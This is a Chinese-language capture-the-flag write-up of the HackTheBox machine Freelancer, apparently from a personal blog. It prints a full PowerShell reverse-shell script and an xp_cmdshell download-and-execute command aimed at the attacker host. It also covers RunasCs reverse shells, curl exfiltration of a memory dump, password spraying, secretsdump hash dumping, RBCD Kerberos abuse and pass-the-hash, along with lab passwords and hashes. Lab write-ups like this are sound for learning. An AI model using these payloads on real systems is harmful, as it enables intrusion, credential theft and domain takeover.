class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 19:20 CST</span><br><span class="line">Warning: 10.10.11.5 giving up on port because retransmission cap hit (10).</span><br><span class="line">sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.5, 16) =&gt; Operation not permitted</span><br><span class="line">Offending packet: TCP 10.10.16.4:35511 &gt; 10.10.11.5:8189 S ttl=44 id=31021 iplen=44  seq=2972970908 win=1024 &lt;mss 1460&gt;</span><br><span class="line">Nmap scan report for 10.10.11.5</span><br><span class="line">Host is up (0.83s latency).</span><br><span class="line">Not shown: 59837 closed tcp ports (reset), 5672 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          nginx 1.25.5</span><br><span class="line">|_http-title: Did not follow redirect to http://freelancer.htb/</span><br><span class="line">|_http-server-header: nginx/1.25.5</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-30 16:21:28Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49683/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49704/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.11.5\SQLEXPRESS:</span><br><span class="line">|     Instance name: SQLEXPRESS</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2019 RTM</span><br><span class="line">|       number: 15.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2019</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|     TCP port: 55297</span><br><span class="line">|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query</span><br><span class="line">|_    Clustered: false</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-10-30T16:19:02</span><br><span class="line">|_Not valid after:  2054-10-30T16:19:02</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.11.5\SQLEXPRESS:</span><br><span class="line">|     Target_Name: FREELANCER</span><br><span class="line">|     NetBIOS_Domain_Name: FREELANCER</span><br><span class="line">|     NetBIOS_Computer_Name: DC</span><br><span class="line">|     DNS_Domain_Name: freelancer.htb</span><br><span class="line">|     DNS_Computer_Name: DC.freelancer.htb</span><br><span class="line">|     DNS_Tree_Name: freelancer.htb</span><br><span class="line">|_    Product_Version: 10.0.17763</span><br><span class="line">|_ssl-date: 2024-10-30T16:23:30+00:00; +5h00m04s from scanner time.</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|Vista|10|2012|Longhorn|7|8.1|2016|11 (94%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_8</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (94%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 2004 (90%), Microsoft Windows Longhorn (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows Server 2012 or Server 2012 R2 (89%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-30T16:23:12</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 5h00m03s, deviation: 0s, median: 5h00m03s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1720/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   689.59 ms 10.10.16.1</span><br><span class="line">2   366.60 ms 10.10.11.5</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 196.91 seconds</span><br></pre></td></tr></table></figure><p>开放若干端口，可以看到这是一台域控，根据80端口的结果，可以发现域名<code>freelancer.htb</code>，将其添加到<code>/etc/hosts</code>中，同时存在<code>SQL Server</code></p><h2 id="SMB">SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.11.5</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030193421240-862466878.png" alt="image-20241030193415328"></p><p>smb没有重要信息</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030195019202-355984579.png" alt="image-20241030195013398"></p><p>扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://freelancer.htb/ -w /usr/share/wordlists/dirb/common.txt -t 5</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030194522012-1201054933.png" alt="image-20241030194515723"></p><p>访问后还是没什么重要信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030210922158-590770136.png" alt="image-20241030210916487"></p><p>随便点了篇文章发现url的数据像是用户的编号</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030210950614-402962867.png" alt="image-20241030210944922"></p><p>测试后发现id为2的时候是admin用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030195947536-985652884.png" alt="image-20241030195941232"></p><p>注册个自由账户登录后发现路由跳转到<code>/job/search/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030200358580-254071980.png" alt="image-20241030200352902"></p><p>发现还是没有登陆进去</p><p>在注册个员工账户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241103185552789-1784702947.png" alt="image-20241030201044315"></p><p>发现没激活不让登录，注意到两个账户登陆的表单是同一个，还有个忘记密码，尝试一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030201435602-1815788951.png" alt="image-20241030201429836"></p><p>通过忘记密码功能成功以员工身份登录到后台</p><h1>获得网站admin权限</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203205421-979958180.png" alt="image-20241030203159702"></p><p>注意到有个QRcode，扫描一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203726339-1392968181.png" alt="image-20241030203720362"></p><p>有一个url，访问url会跳转到当前用户</p><p>注意到中间可能是base64编码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203803580-1093742398.png" alt="image-20241030203757961"></p><p>解码后发现是10012</p><p>之前知道 admin 的 id 是2，感觉可以尝试伪造一下</p><p><strong>ps: 注意每个QRcode生成的链接有时效性，需要在生成QRcode后就替换并访问（这里我试了好多次）</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030211612757-592831591.png" alt="image-20241030211606674"></p><p>获取到网站的admin权限</p><h1>MSSQL通过RCE获得shell</h1><p>当前页面并没有什么新的东西，之前目录扫描知道有admin路由，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031155340969-1949040649.png" alt="image-20241031155320549"></p><p>注意到右下角有个<code>SQL Terminal</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241103185612117-1781510714.png" alt="image-20241031160042048"></p><p>简单执行<code>select @@version;</code>发现可以执行sql语句</p><p>尝试利用sql的执行命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031161914233-762073518.png" alt="image-20241031160156445"></p><p>利用SQL枚举，尝试<code>xp_cmdshell</code></p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands">Pentesting MSSQL</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SYSTEM_USER</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162235113-1486071814.png" alt="image-20241031162228101"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> b.name <span class="keyword">FROM</span> sys.server_permissions a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.server_principals b <span class="keyword">ON</span> a.grantor_principal_id <span class="operator">=</span> b.principal_id <span class="keyword">WHERE</span> a.permission_name <span class="operator">=</span> <span class="string">&#x27;IMPERSONATE&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162246707-191596372.png" alt="image-20241031162238631"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162256855-652593550.png" alt="image-20241031162249651"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;<span class="keyword">EXEC</span> xp_cmdshell whoami;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162307485-1009571644.png" alt="image-20241031162300569"></p><p>接着执行命令获取shell，但是测试后发现有杀软</p><p>准备一个ps1脚本（找了好久才找到，大多数都被杀了，人都麻了）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.ps1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment"># Delay before establishing network connection, and between retries</span></span><br><span class="line">    <span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Connect to C2</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&#x27;10.10.16.4&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125; <span class="keyword">until</span> (<span class="variable">$TCPClient</span>.Connected)</span><br><span class="line"></span><br><span class="line"><span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream()</span><br><span class="line"><span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Writes a string to C2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteToStream</span> <span class="params">(<span class="variable">$String</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment"># Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span></span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$script:Buffer</span> = <span class="number">0</span>..<span class="variable">$TCPClient</span>.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write to C2</span></span><br><span class="line">    <span class="variable">$StreamWriter</span>.Write(<span class="variable">$String</span> + <span class="string">&#x27;SHELL&gt; &#x27;</span>)</span><br><span class="line">    <span class="variable">$StreamWriter</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial output to C2. The function also creates the inital empty byte array buffer used below.</span></span><br><span class="line">WriteToStream <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.</span></span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$BytesRead</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment"># Encode command, remove last byte/newline</span></span><br><span class="line">    <span class="variable">$Command</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$BytesRead</span> - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Execute command and save output (including errors thrown)</span></span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">Invoke-Expression</span> <span class="variable">$Command</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="variable">$_</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write output to C2</span></span><br><span class="line">    WriteToStream (<span class="variable">$Output</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Closes the StreamWriter and the underlying TCPClient</span></span><br><span class="line"><span class="variable">$StreamWriter</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>启动监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031163434222-1715803624.png" alt="image-20241031163426947"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> xp_cmdshell <span class="string">&#x27;powershell -c iex(iwr -usebasicparsing http://10.10.16.4/shell.ps1)&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031180128183-1871641448.png" alt="image-20241031180120472"></p><p>成功获得shell</p><h1>sql_svc-&gt;mikasaAckerman</h1><p>先简单查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031181451778-69892735.png" alt="image-20241031181444181"></p><p>在<code>C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU</code>目录下的<code>sql-Configuration.INI</code>文件中找到俩密码<code>IL0v3ErenY3ager</code>和<code>t3mp0r@ryS@PWD</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031182535485-866862623.png" alt="image-20241031182527902"></p><p>将<code>C:\Users</code>中的用户名保存到<code>users</code>文件中，密码保存至<code>passwd</code>文件中，尝试密码喷洒</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb freelancer.htb -u <span class="built_in">users</span> -p passwd</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031183827237-1394554085.png" alt="image-20241031183819307"></p><p>找到一组正确的凭据<code>mikasaAckerman:IL0v3ErenY3ager</code></p><p>但是<code>winrm</code>并没有成功的凭据</p><p>使用<a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>进行横向，先上传至靶机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="number">10.10</span>.<span class="number">16.4</span>/RunasCs.exe <span class="literal">-outfile</span> RunasCs.exe</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185139899-1944749946.png" alt="image-20241031185131983"></p><p>靶机执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe mikasaAckerman <span class="string">&quot;IL0v3ErenY3ager&quot;</span> <span class="literal">-d</span> freelancer.htb cmd <span class="literal">-r</span> <span class="number">10.10</span>.<span class="number">16.4</span>:<span class="number">8889</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185732331-1762507818.png" alt="image-20241031185724497"></p><p>成功获得<code>mikasaackerman</code>用户权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185853820-131256646.png" alt="image-20241031185846521"></p><p>在<code>Desktop</code>找到<code>user.txt</code></p><h1>mikasaAckerman-&gt;lorra199</h1><p>在<code>mikasaAckerman</code>桌面还有两个文件，其中一个是压缩包</p><p>先看下<code>mail.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031190704941-974279194.png" alt="image-20241031190657225"></p><p>通过smb文件共享来传输文件，这里使用<code>httpuploadexfil</code>工具实现</p><p>先在攻击机建立监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./httpuploadexfil :9999 /root/HackTheBox/Freelancer/share</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031192056276-848032017.png" alt="image-20241031192048419"></p><p>靶机执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="operator">-F</span> <span class="string">&quot;file=@MEMORY.7z&quot;</span> http://<span class="number">10.10</span>.<span class="number">16.4</span>:<span class="number">9999</span>/p</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031192808087-2027884009.png" alt="image-20241031192800564"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031193202144-454390878.png" alt="image-20241031193154701"></p><p>解压后发现是个 <code>DMP</code>文件</p><p>使用<a href="https://github.com/ufrisk/MemProcFS">MemProcFS</a>进行分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./memprocfs -device /root/HackTheBox/Freelancer/share/MEMORY.DMP -mount /root/HackTheBox/Freelancer/dmp_mnt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194502165-752955147.png" alt="image-20241031194454182"></p><p>将其挂载到一个空目录，在切换终端查看该目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194557174-879320302.png" alt="image-20241031194549629"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194716386-270783784.png" alt="image-20241031194708714"></p><p>发现在<code>registry/hive_files</code>目录下找到SAM、SYSTEM和SECURITY文件</p><p>使用<code>secretsdump</code>导出hash值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194947565-950391359.png" alt="image-20241031194939897"></p><p>发现在最下面有一串明文密码<code>PWN3D#l0rr@Armessa199</code></p><p>继续尝试密码喷洒</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031195259082-1047005503.png" alt="image-20241031195251538"></p><p>找到一组凭据<code>lorra199:PWN3D#l0rr@Armessa199</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031201223159-1255973466.png" alt="image-20241031201215390"></p><p>winrm发现也可以使用，直接使用<code>evil-winrm</code>登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031201409985-1471373558.png" alt="image-20241031201402294"></p><p>成功登录<code>lorra199</code>用户</p><h1>权限提升</h1><h2 id="bloodhound信息收集">bloodhound信息收集</h2><p>先使用<code>bloodhound-python</code>信息搜集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.11.5 --dns-tcp -d freelancer.htb -u lorra199 -p PWN3D<span class="comment">#l0rr@Armessa199 -c All --zip</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031202047153-583515341.png" alt="image-20241031202039091"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031204334572-282778564.png" alt="image-20241031204327239"></p><p>发现<code>lorra199</code>用户属于<code>AD RECYCLE BIN</code>组</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031205200402-623938844.png" alt="image-20241031205153099"></p><p>同时还注意到<code>AD RECYCLE BIN</code>组对<code>DC</code>有<code>GenericWrite</code>权限，可以修改该账户的属性，包括设置或更改允许委派到的服务列表，这可以间接实现约束委派（RBCD）</p><h2 id="RBCD">RBCD</h2><blockquote><p>在计算机对象上滥用 <code>GenericWrite</code> 的一种方法是在域上创建一台假计算机，然后写入 DC，该假计算机能够作为 DC 进行委派（使用基于资源的约束委派 （RBCD））。然后，我可以作为 DC 请求票证并充当 DC。</p></blockquote><ul><li>添加计算机</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addcomputer.py -computer-name <span class="string">&#x27;Ya$&#x27;</span> -computer-pass <span class="string">&#x27;Aa123456!&#x27;</span> -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:<span class="string">&#x27;PWN3D#l0rr@Armessa199&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031205840693-1296189239.png" alt="image-20241031205832864"></p><ul><li>使用RBCD，如果这台 PC 属于“域管理员”组，我们将授予它冒充为用户“管理员”的权限</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbcd.py -delegate-from <span class="string">&#x27;Ya$&#x27;</span> -delegate-to <span class="string">&#x27;DC$&#x27;</span> -dc-ip 10.10.11.5 -action <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031210246405-289400388.png" alt="image-20241031210239085"></p><ul><li>使用getST获取服务票证以访问服务CIFS</li></ul><p>在请求票据之前，先与服务器时间同步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -s freelancer.htb</span><br></pre></td></tr></table></figure><p>再请求票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn <span class="string">&#x27;cifs/dc.freelancer.htb&#x27;</span> -dc-ip 10.10.11.5 -impersonate <span class="string">&#x27;administrator&#x27;</span> <span class="string">&#x27;freelancer.htb/Ya:Aa123456!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211232406-563143332.png" alt="image-20241031211224615"></p><p>导入票据，然后使用secretdump获取hash值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py <span class="string">&#x27;freelancer.htb/Administrator@DC.freelancer.htb&#x27;</span> -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntl</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211643068-790736658.png" alt="image-20241031211635032"></p><p>最后<code>evil-winrm</code>登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i freelancer.htb -u administrator -H <span class="string">&#x27;0039318f1e8274633445bce32ad1a290&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211735148-656830288.png" alt="image-20241031211727679"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211810839-438087994.png" alt="image-20241031211803217"></p><p>在<code>Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBox篇之Freelancer</summary>
    
    
    
    <category term="HackTheBox" scheme="https://ya1orin.github.io/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://ya1orin.github.io/tags/HTB/"/>
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
